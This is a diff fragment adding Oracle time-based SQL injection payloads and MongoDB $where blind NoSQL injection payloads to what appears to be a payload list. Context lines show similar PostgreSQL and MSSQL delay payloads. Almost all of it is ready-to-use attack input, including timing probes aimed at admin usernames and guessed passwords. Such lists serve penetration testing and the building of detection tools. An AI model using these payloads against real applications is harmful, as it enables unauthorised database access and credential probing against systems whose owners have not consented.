@@ -93,3 +93,28 @@ AND pg_sleep(5)
 '>;WAITFOR DELAY '00:00:5'--
 ' WAITFOR DELAY ‘0:0:5’ —-
 ' AND 1=CAST((SELECT version()) AS int) --
+
+##Oracle payloads
+
+' AND dbms_pipe.receive_message(('a'),5) -- 
+" AND dbms_pipe.receive_message(('a'),5) -- 
+) AND dbms_pipe.receive_message(('a'),5) -- 
+' AND dbms_lock.sleep(5) -- 
+" AND dbms_lock.sleep(5) -- 
+) AND dbms_lock.sleep(5) -- 
+' OR dbms_pipe.receive_message(('a'),5) -- 
+" OR dbms_pipe.receive_message(('a'),5) -- 
+' OR dbms_lock.sleep(5) -- 
+" OR dbms_lock.sleep(5) -- 
+'; BEGIN dbms_lock.sleep(5); END; -- 
+
+##MongoDB Blind NoSQLi
+
+username[$where]=sleep(5000)
+password[$where]=sleep(5000)
+q[$where]=sleep(5000)
+id[$where]=sleep(5000)
+username[$where]=this.username=='admin' && sleep(5000)
+password[$where]=this.password=='pass' && sleep(5000)
+username[$where]=function(){if(this.username=='admin') sleep(5000); return true;}
+password[$where]=function(){if(this.password=='1234') sleep(5000); return true;}
